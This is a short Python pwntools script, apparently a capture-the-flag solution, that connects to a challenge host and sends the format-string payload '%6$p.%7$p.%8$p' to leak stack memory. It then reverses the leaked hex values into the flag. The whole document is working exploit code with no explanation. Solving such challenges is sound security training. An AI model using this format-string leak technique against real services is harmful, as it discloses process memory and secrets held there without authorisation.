from pwn import *
from binascii import unhexlify

p=remote("bigbrother-pwn-2.chals.io", 443, ssl=True, sni="bigbrother-pwn-2.chals.io")
p.sendlineafter(b' >>>', b'%6$p.%7$p.%8$p')

p.recvuntil(b'heard you say:')
p.recvline()

leak = p.recvline().replace(b'0x',b'').strip(b'\n').split(b'.')

flag = (unhexlify(leak[0])[::-1])
flag += (unhexlify(leak[1])[::-1])
flag += (unhexlify(leak[2])[::-1])[0:3]

print("Flag: %s" %flag)
